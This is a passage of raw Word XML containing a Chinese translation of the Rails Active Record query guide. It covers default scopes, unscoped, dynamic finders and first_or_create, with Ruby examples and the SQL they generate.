        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5616"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="37769A31" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1E6B3573" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11EE4EE7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  default_scope where("removed_at is NULL")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E55AA63" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5C0617F3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">当这个 model 中执行了查询，就会产生类似如下的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 查询语句：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5446"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="376A15B2" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="70D1B06C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="279191917"/>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WHERE</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>removed_at IS</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>NULL</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7BCF2E3E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>14.5 移除所有的作用域</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="562E05E5" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果想移除作用域，我们可以用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>unscope</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法。当某个特定的查询不需要默认作用域时，这个功能尤其有用。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2496"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="5C3CFB5E" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3EA50852" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="2126851774"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.unscoped.all</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2A842D3A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>这个方法移除所有的默认作用域，在数据表上执行普通的查询。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BC7C903" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>15 动态查找方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A7741BF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Active Record 为我们数据表上定义的每个字段都提供了相应的查找方法。如果你的 client 表上有一个 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>first_name</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 字段，你马上可以从 Active Record 那里得到 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_by_first_name</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_all_by_first_name</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 两个查找方法。如果你的 client 表上还有 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>locked</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 字段，那你也可以得到 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_by_locked</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_all_by_locked</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C220511" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">你还可以使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_last_by_*</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 的方法来找到最后一条匹配的记录。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00293E5D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">你还可以在动态查找方法后面加上一个感叹号（ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">）来保证如果没有匹配的记录时抛出一个 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord::RecordNotFound</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 错误，就像 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Client.find_by_name!("Ryan")</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="494A1973" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果你想同时用 name 和 locked 字段来查找数据，可以简单地在字段之间加上 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 来串联这些查找方法。比如说： </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Client.find_by_name_and_locked("Ryan", true)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ABF3C4D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">在 Rails 3.1 及其以下版本中，如果传入一个动态查找方法的参数少于字段数，就像 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Client.find_by_name_and_locked(“Ryan”)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 一样，它会给缺少的字段传递一个 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 值。这是无意义的，所以在 Rails 3.2 中，它会抛出一个 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>AgumentError</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 的异常。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="557930EF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>16 查找并创建一个新对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25572E4C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">通常，你需要先查找一条记录并在它不存在时创建它。这时，你可以使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>first_or_create</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 或者 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>first_or_create!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C97DB8C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">16.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>first_or_create</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08CE5DB5" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>first_or_create</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法先检查 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>first</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法是不是返回 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ，如果是，就调用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>create</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法。它和 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>where</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法一起使用时非常有用。让我们一起看个例子：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FEDA60B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">假设你想找一个叫 ‘Andy’ 的客户的记录，如果没有就创建一条新记录并把它的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>locked</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 字段设为 false 。你可以这样做：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="60904B2F" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0B07E42B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.where(:first_name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'Andy').first_or_create(:locked</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; false)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48C8F5F3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; #&lt;Client id: 1, first_name: "Andy", orders_count: 0, locked: false, created_at: "2011-08-30 06:09:27", updated_at: "201108-30 06:09:27"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1AA13719" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">它会产生类似于如下 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="1438F4B0" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="35CB7893" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>SELECT</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>* FROM</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>clients WHERE</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(clients.first_name = 'Andy') LIMIT 1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="59DD659C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>BEGIN</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D8FF315" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>INSERT</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>INTO</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>clients (created_at, first_name, locked, orders_count, updated_at)  VALUES</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>('2011-08-30 05:22:57', 'Andy', 0, NULL, '2011-08-30 05:22:57')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="366D2533" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>COMMIT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="680FD1A3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>first_or_create</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 返回已存在的或者新创建的一条记录。在我们的例子中，没有一个叫做 Andy 的 client 记录，所以我们新创建了一条记录并返回。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41EA41EA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">这条新创建的记录并不一定能保存到数据库里面，这取决于它能不能通过 validation 的验证（就像 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>create</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法一样）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52EF96D5" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>first_or_create</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 每必要关心 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>where</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法的参数。在上面的例子中，我们并没有明确给 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>first_or_create</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法传递 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:first_name =&gt; 'Andy'</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 的参数。然而，在创建新记录时，依然使用了这个参数，因为这个参数已经传给了 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>where</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C7A47A3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">你也可以这样用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_or_create_by</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="4E761364" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0A1B2564" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="560798582"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.find_or_create_by_first_name(:first_name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "Andy", :locked</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; false)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="22D2C7A9" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">这个方法也可行，但是我们鼓励使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>first_or_create</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法，因为它能明确指定那些参数传给 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>find</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法，那些参数传给 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>create</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法，这样能避免很多混乱。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B425A31" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">16.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>first_or_create!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B8ABB55" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果你使用了 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>first_or_create</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法，那当新记录不合法时，就会抛出一个异常。这篇指导不包含 validation 的知识，但是我们可以假定你暂时添加了以下代码到你的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Client</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 的 model 中。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5184"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="3B52D377" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="644161D3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="2059817066"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>validates :orders_count, :presence</w:t>
            </w:r>
            <w:r>
